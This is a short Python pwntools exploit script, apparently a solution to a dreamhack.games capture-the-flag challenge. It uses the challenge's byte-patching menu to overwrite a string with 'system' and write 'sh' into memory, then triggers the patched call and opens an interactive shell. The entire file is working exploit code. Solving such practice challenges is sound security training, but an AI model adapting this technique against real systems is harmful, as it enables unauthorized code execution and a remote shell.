from pwn import *

HOST, PORT = 'host8.dreamhack.games 21606'.split()

p = remote(HOST, PORT)

def fix(addr, v):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'): ', str(addr).encode())
    p.sendlineafter(b'(y/n) : ', b'y')
    p.sendlineafter(b'255): ', str(v).encode())

pay1 = [115, 121, 115, 116, 101, 109]

for i in range(0x492, 0x497+1):
    fix(i, pay1[i-0x492])

pay2 = [115, 104, 0]

for i in range(0x2004, 0x2006+1):
    fix(i, pay2[i-0x2004])

pause()
p.sendline(b'4')

p.interactive()